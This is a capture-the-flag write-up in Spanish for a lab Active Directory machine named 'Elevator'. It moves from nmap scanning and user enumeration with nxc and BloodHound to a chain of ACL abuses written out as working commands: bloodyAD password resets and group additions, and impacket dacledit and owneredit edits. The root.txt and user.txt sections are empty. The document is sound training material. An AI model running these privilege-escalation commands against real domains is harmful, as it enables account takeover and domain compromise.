# Máquina Elevator
### Reconocimiento de la Ip de la máquina víctima

![alt text](image-13.png)

La máquina brinda un usuario y contraseña:

usuario: john.smith
contraseña: Rk436\#Z4&

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 10.0.2.34

![alt text](image-14.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49669,63375,63381,63382,63760,63814 -vvv -Pn 10.0.2.34

![alt text](image.png)

Estoy frente a un Active Directory

como tenemos un usuario y contraseña y tenemos el smb enumeré usuarios.

### Enumeración de usuarios

nxc smb 10.0.2.34 -u 'john.smith' -p 'Rk436\#Z4&' --rid-brute | grep SidTypeUser

![alt text](image-1.png)

### Bloodhound 

utilicé dnschef porque tenía problemas con la resolución DNS.

dnschef --fakeip 10.0.2.34

bloodhound-python -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' -c all --zip -dc bloodhound.thl -ns 127.0.0.1

![alt text](image-2.png)

### Explotación 

Abrí bloodhound para ver en gráficos la relación de confianza que tienen cada uno de los usuarios que encontré líneas arriba y así encontrar la mejor ruta de ser domain admin.

Analizo al usuario JOHN.SMITH

![alt text](image-3.png)

Nota: el usuario JOHN.SMITH@BLOODHOUND.THL tiene permiso AddSelf sobre el grupo FNANZIAS@BLOODHOUND.THL

Analizo al grupo FINANZAS

![alt text](image-4.png)

Nota: el grupo finanzas tiene permisos GenericAll sobre el usuario MARY.JOHNSON@BLOODHOUND.THL

Analizo al usuario MARY.JOHNSON@BLOODHOUND.THL

![alt text](image-5.png)

Nota: el usuario MARY.JOHNSON@BLOODHOUND.THL tiene permisos ForceChangePassword sobre el usuario ROBERT.WILLIAMS@BLOODHOUND.THL

Analizo al usuario ROBERT.WILLIAMS@BLOODHOUND.THL

![alt text](image-6.png)

Nota: el usuario OBERT.WILLIAMS@BLOODHOUND.THL es miembro del grupo MARKETING@BLOODHOUND.THL y este grupo tiene permisos WriteDacl sobre el usuario PATRICIA.BROWN@BLOODHOUND.THLR

Analizo al usuario PATRICIA.BROWN@BLOODHOUND.THL

![alt text](image-7.png)

Nota: el usuario PATRICIA.BROWN@BLOODHOUND.THL tiene permiso WriteOwner sobre el grupo OPERACIONES@BLOODHOUND.THL

Analizo el usuario MICHAEL.JONES@BLOODHOUND.THL

![alt text](image-8.png)

![alt text](image-9.png)

![alt text](image-10.png)

Nota: el usuario MICHAEL.JONES@BLOODHOUND.THL tiene permiso DCSync sonbre el dominio BLOODHOUND.THL, tiene permiso AdminTo sobre el equipo Elevator (es el equipo al que le estoy haciendo pentesting) como también pertenece al grupo de ADMINISTRADORES@BLOODHOUND.THL

### EXPLOTACIÓN

- Añadí al usuario JOHN.SMITH al grupo FINANZAS

bloodyAD --host bloodhound.thl -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' add groupMember FINANZAS john.smith

![alt text](image-11.png)

- El grupo finanzas tiene los permisos de GenericAll sobre MARY.JOHNSON, cambio la contraseña de MARY.JOHNSON

bloodyAD --host bloodhound.thl -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' set password MARY.JOHNSON admin12345

![alt text](image-12.png)

- El usuario MARY.JOHNSON tiene permisos ForceChangePassword sobre el usuario ROBERT.WILLIAMS@BLOODHOUND.THL, le cambiamos la contraseña

bloodyAD --host bloodhound.thl -d bloodhound.thl -u 'mary.johnson' -p 'admin12345' set password ROBERT.WILLIAMS admin12345

![alt text](image-15.png)

- el usuario ROBERT.WILLIAMS es miembro del grupo MARKETING y este grupo tiene permisos WriteDacl sobre PATRICIA.BROWN

Abuso de DACL

impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ROBERT.WILLIAMS' -target 'PATRICIA.BROWN' 'bloodhound.thl/ROBERT.WILLIAMS:admin12345'

![alt text](image-16.png)

- Cambio de contraseña al usuario PATRICIA.BROWN

bloodyAD --host bloodhound.thl -d bloodhound.thl -u 'ROBERT.WILLIAMS' -p 'admin12345' set password PATRICIA.BROWN admin12345

![alt text](image-17.png)

- Cambiar el owner del grupo OPERACIONES

impacket-owneredit -action write -new-owner 'PATRICIA.BROWN' -target 'OPERACIONES' 'bloodhound.thl/PATRICIA.BROWN:admin12345'

![alt text](image-18.png)

- Agregar permisos de escritura sobre el grupo OPERACIONES 

impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl/PATRICIA.BROWN:admin12345'

![alt text](image-19.png)

- Uno a PATRICIA.BROWN al grupo OPERACIONES

bloodyAD --host bloodhound.thl -d bloodhound.thl -u 'PATRICIA.BROWN' -p 'admin12345' add groupMember OPERACIONES PATRICIA.BROWN

![alt text](image-20.png)

### user.txt



### root.txt

